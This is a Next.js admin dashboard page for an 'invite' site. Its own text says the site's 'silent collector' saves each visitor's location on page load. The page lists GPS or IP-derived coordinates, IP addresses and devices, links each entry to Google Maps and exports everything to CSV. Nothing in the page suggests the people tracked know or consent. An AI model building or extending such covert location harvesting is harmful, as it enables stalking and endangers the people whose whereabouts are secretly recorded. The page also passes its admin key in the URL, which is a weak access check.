"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import Link from "next/link";
import { THEMES, type Theme } from "@/lib/theme";
import type { SavedLocation } from "@/app/api/location/route";

type Status = "idle" | "loading" | "ok" | "empty" | "unauthorized" | "error";

const fmtDate = (iso: string): string => {
  try {
    return new Date(iso).toLocaleString(undefined, {
      month: "short",
      day: "numeric",
      hour: "numeric",
      minute: "2-digit",
    });
  } catch {
    return iso;
  }
};

const mapsUrl = (lat: number, lng: number): string =>
  `https://www.google.com/maps?q=${lat},${lng}`;

const shortUA = (ua: string): string => {
  if (!ua) return "—";
  if (/iPhone/i.test(ua)) return "iPhone";
  if (/Android/i.test(ua)) return "Android";
  if (/Macintosh|Mac OS/i.test(ua)) return "Mac";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Linux/i.test(ua)) return "Linux";
  return ua.slice(0, 28) + (ua.length > 28 ? "…" : "");
};

function toCsv(rows: SavedLocation[]): string {
  const esc = (v: unknown): string => {
    const s = v === null || v === undefined ? "" : String(v);
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  const header = ["id", "lat", "lng", "accuracy", "source", "ip", "userAgent", "createdAt"];
  const lines = rows.map((r) =>
    [r.id, r.lat, r.lng, r.accuracy ?? "", r.source, r.ip ?? "", r.userAgent ?? "", r.createdAt]
      .map(esc)
      .join(",")
  );
  return [header.join(","), ...lines].join("\n");
}

export default function AdminPage() {
  const t: (typeof THEMES)[Theme] = THEMES.midnight;
  const [key, setKey] = useState("");
  const [unlocked, setUnlocked] = useState(false);
  const [rows, setRows] = useState<SavedLocation[]>([]);
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState("");
  const [filter, setFilter] = useState<"all" | "gps" | "ip">("all");
  const [query, setQuery] = useState("");

  const fetchRows = useCallback(async (adminKey: string) => {
    setStatus("loading");
    setError("");
    try {
      const url = adminKey
        ? `/api/location?limit=200&key=${encodeURIComponent(adminKey)}`
        : "/api/location?limit=200";
      const res = await fetch(url, {
        headers: adminKey ? { "x-admin-key": adminKey } : undefined,
      });
      if (res.status === 401) {
        setStatus("unauthorized");
        setRows([]);
        setError("Wrong key — try again.");
        return;
      }
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data: unknown = await res.json();
      const list =
        typeof data === "object" && data !== null && "locations" in data
          ? (data as { locations: unknown }).locations
          : [];
      const clean = Array.isArray(list) ? (list as SavedLocation[]) : [];
      setRows(clean);
      setStatus(clean.length === 0 ? "empty" : "ok");
      setUnlocked(true);
    } catch {
      setStatus("error");
      setError("Couldn't reach the database. Check DATABASE_URL / network, then retry.");
    }
  }, []);

  useEffect(() => {
    void fetchRows("");
  }, [fetchRows]);

  const visible = useMemo(() => {
    const q = query.trim().toLowerCase();
    return rows.filter((r) => {
      if (filter !== "all" && r.source !== filter) return false;
      if (!q) return true;
      return (
        r.id.toLowerCase().includes(q) ||
        (r.ip ?? "").toLowerCase().includes(q) ||
        (r.userAgent ?? "").toLowerCase().includes(q) ||
        String(r.lat).includes(q) ||
        String(r.lng).includes(q)
      );
    });
  }, [rows, filter, query]);

  const stats = useMemo(() => {
    const gps = rows.filter((r) => r.source === "gps").length;
    const ip = rows.filter((r) => r.source === "ip").length;
    const latest = rows[0]?.createdAt ? fmtDate(rows[0].createdAt) : "—";
    return { total: rows.length, gps, ip, latest };
  }, [rows]);

  const downloadCsv = () => {
    const blob = new Blob([toCsv(visible)], { type: "text/csv" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = "locations.csv";
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 4000);
  };

  const submitKey = (e: React.FormEvent) => {
    e.preventDefault();
    void fetchRows(key.trim());
  };

  return (
    <main className={`relative min-h-screen min-h-dvh px-5 py-10 ${t.page}`}>
      <div className="mx-auto w-full max-w-3xl">
        <div className="mb-6 flex items-start justify-between gap-3">
          <div>
            <h1 className="font-[Georgia,serif] text-3xl font-bold">
              Visitor locations 📍
            </h1>
            <p className={`${t.muted} mt-1 text-sm font-semibold`}>
              Silent saves from your invite — newest first.
            </p>
          </div>
          <Link
            href="/"
            className={`btn-opt btn-focus shrink-0 px-4 py-2 text-sm ${t.soft} ${t.softText}`}
          >
            ← Invite
          </Link>
        </div>

        {!unlocked && (status === "unauthorized" || status === "idle") ? (
          <form
            onSubmit={submitKey}
            className={`rounded-2xl border-2 p-5 ${t.card} ${t.border}`}
          >
            <label htmlFor="admin-key" className="text-sm font-extrabold">
              Admin key
            </label>
            <p className={`${t.muted} mt-1 text-sm font-semibold`}>
              This dashboard is locked. Enter the ADMIN_KEY you set in env.
            </p>
            <div className="mt-3 flex gap-2">
              <input
                id="admin-key"
                name="admin-key"
                type="password"
                autoComplete="off"
                value={key}
                onChange={(e) => setKey(e.target.value)}
                placeholder="••••••••"
                className={`field-input ${t.input} ${t.inputBorder} ${t.ring}`}
              />
              <button
                type="submit"
                className={`btn-yes btn-focus shrink-0 ${t.accentBg} ${t.accentTextOn}`}
              >
                Unlock
              </button>
            </div>
            {error ? (
              <p className="mt-3 text-sm font-bold text-red-400">{error}</p>
            ) : null}
          </form>
        ) : null}

        {unlocked ? (
          <>
            <div className="mb-4 grid grid-cols-2 gap-2 sm:grid-cols-4">
              {[
                { label: "Total saves", value: String(stats.total) },
                { label: "GPS", value: String(stats.gps) },
                { label: "IP fallback", value: String(stats.ip) },
                { label: "Latest", value: stats.latest },
              ].map((s) => (
                <div
                  key={s.label}
                  className={`rounded-2xl border-2 px-3 py-2.5 ${t.card} ${t.border}`}
                >
                  <div className={`${t.muted} text-xs font-bold`}>{s.label}</div>
                  <div className="truncate text-base font-extrabold" title={s.value}>
                    {s.value}
                  </div>
                </div>
              ))}
            </div>

            <div className={`mb-4 flex flex-wrap gap-2 rounded-2xl border-2 p-3 ${t.card} ${t.border}`}>
              <input
                type="search"
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                placeholder="Search id / ip / device / coords…"
                className={`field-input min-w-40 flex-1 ${t.input} ${t.inputBorder} ${t.ring}`}
              />
              {(["all", "gps", "ip"] as const).map((f) => (
                <button
                  key={f}
                  type="button"
                  onClick={() => setFilter(f)}
                  className={`btn-opt btn-focus flex-none px-4 py-2 text-sm capitalize ${
                    filter === f ? `${t.accentBg} ${t.accentTextOn}` : `${t.soft} ${t.softText}`
                  }`}
                >
                  {f === "all" ? "All" : f.toUpperCase()}
                </button>
              ))}
              <button
                type="button"
                onClick={() => void fetchRows(key.trim())}
                className={`btn-opt btn-focus flex-none px-4 py-2 text-sm ${t.soft} ${t.softText}`}
              >
                ↻ Refresh
              </button>
              <button
                type="button"
                onClick={downloadCsv}
                disabled={visible.length === 0}
                className={`btn-opt btn-focus flex-none px-4 py-2 text-sm ${t.soft} ${t.softText} disabled:cursor-not-allowed disabled:opacity-50`}
              >
                ⬇ CSV
              </button>
            </div>
          </>
        ) : null}

        {status === "loading" ? (
          <p className={`${t.muted} py-10 text-center font-bold`}>Loading locations…</p>
        ) : null}
        {status === "error" && unlocked ? (
          <div className={`rounded-2xl border-2 p-5 text-center ${t.card} ${t.border}`}>
            <p className="font-bold text-red-400">{error || "Failed to load."}</p>
            <button
              type="button"
              onClick={() => void fetchRows(key.trim())}
              className={`btn-opt btn-focus mt-3 px-5 py-2 text-sm ${t.soft} ${t.softText}`}
            >
              Try again
            </button>
          </div>
        ) : null}
        {status === "empty" ? (
          <div className={`rounded-2xl border-2 p-8 text-center ${t.card} ${t.border}`}>
            <div className="text-4xl">📭</div>
            <p className="mt-2 font-extrabold">No locations yet</p>
            <p className={`${t.muted} mt-1 text-sm font-semibold`}>
              Open your invite in a browser — the silent collector saves on page load.
            </p>
          </div>
        ) : null}

        {visible.length > 0 ? (
          <ul className="space-y-2.5">
            {visible.map((r) => (
              <li
                key={r.id}
                className={`rounded-2xl border-2 p-4 ${t.card} ${t.border}`}
              >
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <span
                      className={`rounded-full px-2.5 py-1 text-xs font-extrabold ${
                        r.source === "gps"
                          ? `${t.accentBg} ${t.accentTextOn}`
                          : `${t.soft} ${t.softText}`
                      }`}
                    >
                      {r.source === "gps" ? "📡 GPS" : "🌐 IP"}
                    </span>
                    <span className="font-mono text-sm font-bold">
                      {Number(r.lat).toFixed(5)}, {Number(r.lng).toFixed(5)}
                    </span>
                  </div>
                  <a
                    href={mapsUrl(Number(r.lat), Number(r.lng))}
                    target="_blank"
                    rel="noopener noreferrer"
                    className={`text-sm font-extrabold underline ${t.accent}`}
                  >
                    Open map ↗
                  </a>
                </div>
                <div className={`${t.muted} mt-2 grid gap-1 text-xs font-semibold sm:grid-cols-2`}>
                  <span>🕒 {fmtDate(r.createdAt)}</span>
                  <span title={r.userAgent ?? ""}>📱 {shortUA(r.userAgent ?? "")}</span>
                  <span>🎯 ±{r.accuracy != null ? `${Math.round(Number(r.accuracy))}m` : "?"}</span>
                  <span className="truncate" title={r.ip ?? ""}>🌍 {r.ip || "—"}</span>
                </div>
              </li>
            ))}
          </ul>
        ) : null}
        {status === "ok" && visible.length === 0 ? (
          <p className={`${t.muted} py-8 text-center font-bold`}>
            No rows match — clear search / filter.
          </p>
        ) : null}
      </div>
    </main>
  );
}
